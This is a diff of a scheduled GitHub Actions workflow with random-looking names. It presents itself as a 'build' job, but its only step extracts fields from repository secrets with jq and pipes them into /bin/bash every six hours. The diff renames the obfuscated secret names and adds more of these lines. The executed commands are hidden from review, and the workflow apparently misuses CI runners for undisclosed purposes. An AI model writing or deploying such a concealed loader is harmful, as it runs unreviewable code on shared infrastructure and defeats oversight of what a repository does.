@@ -1,20 +1,25 @@
 name: dadanmaxo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dadanmaxo
         env:
-          qokmq2396: ${{ secrets.qokmq2396 }}
+          xypw330: ${{ secrets.xypw330 }}
         run: |
-          echo $qokmq2396 | jq -r .p653 | /bin/bash
-          echo $x40 | jq -r .ypu2597 | /bin/bash
-          echo $zbdip71 | jq -r .hs71639 | /bin/bash
-          echo $liadk684 | jq -r .hpkj3347 | /bin/bash
-          echo $etqjm02 | jq -r .b274 | /bin/bash
+          echo $xypw330 | jq -r .mpqo42 | /bin/bash
+          echo $edcq56 | jq -r .wfbb5 | /bin/bash
+          echo $ms268 | jq -r .a52631 | /bin/bash
+          echo $dla3 | jq -r .cols4979 | /bin/bash
+          echo $w8 | jq -r .xc7 | /bin/bash
+          echo $qlp65 | jq -r .xamy49 | /bin/bash
+          echo $nwr13659 | jq -r .xzyc791 | /bin/bash
+          echo $dm736 | jq -r .klto84 | /bin/bash
 
